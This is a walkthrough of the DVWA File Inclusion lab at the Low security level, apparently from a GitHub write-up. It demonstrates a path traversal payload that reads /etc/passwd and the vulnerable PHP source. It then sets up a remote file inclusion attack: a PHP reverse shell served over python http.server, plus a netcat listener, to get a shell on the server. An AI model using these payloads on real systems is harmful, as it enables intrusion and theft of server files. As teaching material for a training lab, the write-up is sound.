# File Inclusion

## About

> Some web applications allow the user to specify input that is used directly into file streams or allows the user to upload files to the server.<br />
> At a later time the web application accesses the user supplied input in the web applications context. By doing this, the web application is allowing the potential for malicious file execution.<br />
> If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other machines, which then the attack is a "Remote File Inclusion (RFI).<br />
> When RFI is not an option. using another vulnerability with LFI (such as file upload and directory traversal) can often achieve the same effect.
> 
> Note, the term "file inclusion" is not the same as "arbitrary file access" or "file disclosure".

Source: DVWA Documentation

## Low Security

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi1.png?raw=true">
</p>

For this vulnerability we have 3 buttons to file1.php, file2.php and file3.php.
When we access for example the first file, we can see in the URL, the name of the file sent it as the value for the `page` parameter.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi2.png?raw=true">
</p>

This value can be changed to the name of other valid files from the server. Below we can see that we manage to access the file4.php, even if this was not displayed as an option.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi3.png?raw=true">
</p>

To move around to the server's directories we can use `../../`. Every `../` will move us to the parent directory.
Using this syntax, we can read files from different places.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi4.png?raw=true">
</p>

For example we can use: `http://localhost/DVWA/vulnerabilities/fi/?page=../../../../../../../../etc/passwd` to read all local users on the server.
This payload is using many `../`, because we want to access the `/etc/passwd` from the root path `/`. So we add many `../` to be sure that we arrived at the root path.

The source code looks like this:
```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?> 
```
So we can see that the parameter is missing any validation.

The objective of this exercise is to gain access to `../hackable/flags/fi.php` and to read all five quotes.
The exact payload does not work, but going back one more directory will include the file into the page.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi5.png?raw=true">
</p>

Ok, we can read some of the quotes, but not all five. Visiting the source code of the page we can see that the fifth quote is commented.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi6.png?raw=true">
</p>

Even if we directly visit the page, not through the file inclusion vulnerability, a prevention measure was put in place for that.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi7.png?raw=true">
</p>

That means that the third one is not accessible via client-side.

## File Inclusion vs Directory Traversal
The difference between these 2 is that through the directory traversal vulnerability we will be able to read files from the system, but with file inclusion, the file is also included in the page.
This is why we were not able to read the fifth quote directly from the page, because the php code was executed, so the comment line was treated as a comment and not included as text in the page.

For example reading `/etc/passwd` will be the same for directory traversal and also for file inclusion because is just a file with text.
Instead trying to read login.php, in directory traversal we will see all the content of the file as text, and in the file inclusion the content will be included in the page, like in the example below:

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi8.png?raw=true">
</p>

## Remote File Inclusion
Ok, we still didn't read the third quote, so what can we do?
There are 2 types of file inclusion, local and remote. We already saw in the previous examples the file included from the local, that means that the remote file inclusion will come from a different domain.
So instead of giving local files as parameter, we will give a new address: `http://localhost/DVWA/vulnerabilities/fi/?page=http://example.com/example.php`.
Now, on our page we will be able to see the content of the files from other domains.

RFI is more dangerous than LFI because usually leads to Remote Code Execution.
For the next example we will host a python server and use a reverse shell for the RFI vulnerability.

A php reverse shell can be downloaded from here: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Edit it with the ip of your machine and the port you want to use, for this example the ip will be 127.0.0.1 and port 4444.
Start a python server at the location of the reverse shell file: `python3 -m http.server 4445`
Start a netcat listener: `nc -lvnp 4444`
And now we can access the URL: `http://localhost/DVWA/vulnerabilities/fi/?page=http://127.0.0.1:4445/rev.php`
Now we have access on the server and we can go and read the `/hackable/flags/fi.php` file.

<p align="center">
  <img src="https://github.com/Abdy01/DVWA-Walkthrough/blob/main/File-Inclusion/!images/fi9.png?raw=true">
</p>

Is interesting that the fourth message is encrypted in the file, so we were able to read it the first time with the help of file inclusion vulnerability.

## Medium Security

## High Security

## Impossible Security
